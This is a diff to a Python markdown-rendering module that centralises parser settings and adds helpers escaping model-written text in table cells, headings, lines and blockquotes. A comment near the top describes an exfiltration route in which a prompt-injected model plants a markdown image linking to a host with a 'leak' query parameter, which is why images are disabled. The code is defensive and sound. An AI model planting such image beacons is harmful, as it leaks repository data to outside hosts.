@@ -13,11 +13,23 @@ from typing import Callable, Optional
 from markdown_it import MarkdownIt
 
 from .llm import extract_mermaid  # noqa: F401  (re-exported for custom renderers)
+from .text import printable  # noqa: F401  (the renderers' callers reach it from here)
 
 # coderay-q2r.53: image syntax is off. `![x](https://host/p?leak=...)` became a
 # live <img> that fires on page open, an egress channel from repo text via
 # a prompt-injected model. html=False does not cover it.
-_MD = MarkdownIt("commonmark", {"html": False, "linkify": False, "breaks": False}).enable(["table"]).disable("image")
+
+
+def markdown_parser(*extra, image=False):
+    """The one markdown configuration every renderer uses: no raw HTML, no
+    autolinking (a model cannot plant a link by naming a host), no hard line
+    breaks, tables on, and images off unless a renderer asks (an image is a
+    beacon, coderay-q2r.53). A security flip is made here once."""
+    parser = MarkdownIt("commonmark", {"html": False, "linkify": False, "breaks": False}).enable(["table", *extra])
+    return parser if image else parser.disable("image")
+
+
+_MD = markdown_parser()
 
 @dataclass(frozen=True)
 class Section:
@@ -106,26 +118,36 @@ def split_cards(markdown):
         cards.append((title.strip(), "\n".join(body).strip()))
     return cards
 
-_CONTROL = re.compile(r"[\x00-\x08\x0b-\x1f\x7f]")
+_TRAILING_HASHES = re.compile(r"\s(#+)$")
 
 
 def md_cell(text):
     """Model text made safe inside a markdown pipe table: pipes escaped and
-    newlines flattened, so one cell cannot split or close the row."""
-    return str(text or "").replace("|", "\\|").replace("\r", " ").replace("\n", " ").strip()
+    line endings flattened, so one cell cannot split or close the row."""
+    return md_line(str(text or "").replace("|", "\\|"))
 
 
-def md_heading(text):
-    """Model text made safe as a markdown heading: one line, so a newline in it
-    cannot end the heading and let the next line pose as one."""
+def md_line(text):
+    """Model text made safe as one line of markdown (a list item, say): every
+    line ending becomes a space, so what follows cannot become a block of its
+    own."""
     return " ".join(str(text or "").split())
 
 
-def printable(text, limit):
-    """Model text for the terminal: control characters removed, whitespace
-    collapsed, cut to `limit`, so a reply cannot move the cursor or fake a
-    line of the run's own output."""
-    return " ".join(_CONTROL.sub("", str(text or "")).split())[:limit]
+def md_heading(text):
+    """Model text made safe as a markdown heading: one line, and a trailing run
+    of # escaped, since CommonMark reads that as the heading's closing sequence
+    and drops it."""
+    return _TRAILING_HASHES.sub(lambda m: " \\" + m.group(1), md_line(text))
+
+
+def md_quote(text):
+    """Model text made safe as a markdown blockquote: every line carries the
+    marker, so a newline cannot end the quote early."""
+    lines = str(text or "").splitlines() or [""]
+    return "\n".join(("> " + line).rstrip() for line in lines)
+
+
 
 
 def card(header_md, body_md):
